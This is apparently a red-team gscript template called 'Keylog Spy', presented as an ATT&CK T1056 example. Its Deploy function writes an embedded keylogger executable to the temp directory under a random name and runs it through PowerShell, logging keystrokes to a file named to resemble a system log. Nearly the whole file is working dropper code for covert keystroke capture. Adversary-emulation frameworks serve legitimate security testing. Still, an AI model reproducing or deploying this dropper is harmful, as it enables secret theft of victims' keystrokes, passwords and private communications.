// Example gscript template
// Title: Keylog Spy
// Author: ahhh, modified by heywoodlh
// Purpose: keylogger!
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1056
// Using https://github.com/GiacomoLaw/Keylogger, logging to %TEMP%/System32Log.txt

//priority:150
//timeout:150
//import:resources/keylogger64.exe
//go_import:os as os

function Deploy() {  
    console.log("Starting Keylog");

    // Prep the sample
    var spy = GetAssetAsBytes("keylogger64.exe");
    // Getting a temp file path
    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaString(4);
    naming = naming.toLowerCase();
    var fullpath = temppath+naming+".exe";

    // Write the sample
    console.log("file name: "+ fullpath);
    errors = G.file.WriteFileFromBytes(fullpath, spy[0]);
    console.log("errors: "+errors);

    var cmd = fullpath;
    var running = G.exec.ExecuteCommandAsync("powershell", [cmd]);
    console.log("errors: "+running[1]);

    console.log("Done Keylog");
    return true;
  }
  
